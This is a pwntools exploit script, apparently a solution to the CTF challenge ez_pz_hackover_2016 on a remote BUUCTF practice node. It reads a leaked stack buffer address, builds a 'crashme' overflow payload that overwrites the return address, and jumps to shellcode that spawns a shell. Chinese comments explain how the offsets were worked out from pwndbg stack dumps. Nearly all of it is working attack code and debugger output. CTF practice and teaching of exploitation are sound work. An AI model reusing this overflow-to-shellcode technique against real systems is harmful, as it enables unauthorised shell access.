from pwn import *

# r = process(r'./ez_pz_hackover_2016')
r = remote('node5.buuoj.cn', 29147)

context.arch = 'i386'
context.os = "linux"
context.log_level = 'debug'

r.recvuntil(b'crash: ')
buf_addr = int(r.recvuntil(b'\n', drop=True), 16)
print(hex(buf_addr))

#gdb.attach(r, 'b *main')

shellcode = asm(shellcraft.sh())

# payload = b'crashme\x00' + b'A' * (0x4c - 0x8) + b'B' * 4 + shellcode
'''
# 现在的困难点在于找不到输入的shellcode的内存地址，因为vuln函数是子函数，而我们得到的数组地址是父函数中的地址，因此无法直接增加偏移得到shellcode地址。
# 建议使用动态调试，将断点设置在vuln函数的leave处，此时可以看到memcpy复制的内容的栈中的相对位置。
调试payload: b'crashme\x00' + b'A' * 6
pwndbg> stack 50
00:0000│ esp         0xfff76ba0 ◂— 0x1
01:0004│ eax-2 edx-2 0xfff76ba4 ◂— 0x6bfc0000
02:0008│-030         0xfff76ba8 ◂— 0x400fff7
03:000c│-02c         0xfff76bac ◂— 0x70000
04:0010│-028         0xfff76bb0 ◂— 0x10000
05:0014│-024         0xfff76bb4 ◂— 0x6ce00000
06:0018│-020         0xfff76bb8 ◂— 0xfff7
07:001c│-01c         0xfff76bbc ◂— 0x0
08:0020│-018         0xfff76bc0 ◂— 0x72630000
09:0024│-014         0xfff76bc4 ◂— 'ashme'
0a:0028│-010         0xfff76bc8 ◂— 0x41410065 /* 'e' */
0b:002c│-00c         0xfff76bcc ◂— 'AAAA\n'
0c:0030│-008         0xfff76bd0 ◂— 0x823c000a /* '\n' */
0d:0034│-004         0xfff76bd4 ◂— 0x5a600804
0e:0038│ ebp         0xfff76bd8 ◂— 0x6c40f7f5
0f:003c│+004         0xfff76bdc ◂— 0x4fecfff7
10:0040│+008         0xfff76be0 ◂— 0xf7f5
11:0044│+00c         0xfff76be4 ◂— 0x140000
12:0048│+010         0xfff76be8 ◂— 0x0
13:004c│+014         0xfff76bec ◂— 0x40000
14:0050│+018         0xfff76bf0 ◂— 0xcfb60000
15:0054│+01c         0xfff76bf4 ◂— 0xa024f7f2
16:0058│+020         0xfff76bf8 ◂— 0x9ddc0804
17:005c│+024         0xfff76bfc ◂— 0x4f7ef

可以发现ebp在0x38偏移处，而我们输入的crashme中的c保存在0x22处（小端序保存，0x20上的参数 0x72 63 f7 f6对应的是0x23,0x22,0x21,0x20 ）
因此vuln数组的起始位置想对于ebp偏移为0x38-0x22=0x16,而函数返回地址还需要增加0x4字节的ebp长度。
所以 ‘crackme\x00’ 的长度是8字节，最终padding=0x16+4-8

接下来就是需要计算shellcode的相对地址了，因为目前我们已知了 buf_addr 输入的首地址：0xfff76bfc
而 ebp+4 处是覆盖 ebp之后要传给rip的内存地址，我们规划在这里放置shellcode的地址（不是shellcode值本身）
那么 ebp+8 处就是写入我们的shellcode了，所以 shellcode：0xfff76bdc（ebp+8）距离泄漏的buf_addr地址：0xfff76bfc 相差：0x1c
shellcode的地址是：buf_addr-(0x5c-0x40)即array_addr-0x1c
'''
payload = b'crashme\x00' + b'A' * (0x16 - 8 + 4) + p32(buf_addr - 0x1c) + shellcode

r.sendlineafter(b'> ', payload)
r.interactive()
